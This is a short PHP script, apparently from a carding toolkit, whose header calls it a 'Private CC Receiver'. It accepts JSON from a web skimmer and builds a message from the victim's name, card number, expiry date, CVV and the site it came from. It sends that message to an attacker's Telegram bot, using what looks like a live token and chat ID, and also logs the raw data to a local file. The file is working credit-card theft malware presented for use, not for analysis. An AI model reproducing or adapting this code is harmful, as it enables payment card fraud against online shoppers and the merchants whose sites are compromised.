<?php
/**
 * SYSHACK-OSC V2 - Private CC Receiver
 * -----------------------------------
 * Simpan data ke log lokal + Kirim ke Telegram
 */

// Konfigurasi Telegram
$botToken = "8793000527:AAGOtDiTa5y3qtNcQtYQixZ4tmebPdmfmP0"; // Ganti dengan token bot lu
$chatId = "8235457641";     // Ganti dengan chat ID lu

// Terima data JSON dari skimmer
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if ($data) {
    // Format pesan buat Telegram
    $text = "🔥 *MgtWaveH4ck - New Hit!* 🔥\n\n";
    $text .= "👤 Name: " . $data['cc_name'] . "\n";
    $text .= "💳 Card: " . $data['cc_number'] . "\n";
    $text .= "📅 Exp: " . $data['cc_exp'] . "\n";
    $text .= "🔑 CVV: " . $data['cc_cvv'] . "\n";
    $text .= "🌐 Site: " . $data['page_url'] . "\n";
    $text .= "🕒 Time: " . $data['timestamp'] . "\n";

    // Kirim ke Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=Markdown&text=" . urlencode($text);
    @file_get_contents($url);

    // Simpan ke log lokal (Backup)
    file_put_contents("hits_db.txt", $raw . PHP_EOL, FILE_APPEND);
    
    echo json_encode(["status" => "success"]);
} else {
    echo json_encode(["status" => "error"]);
}
?>
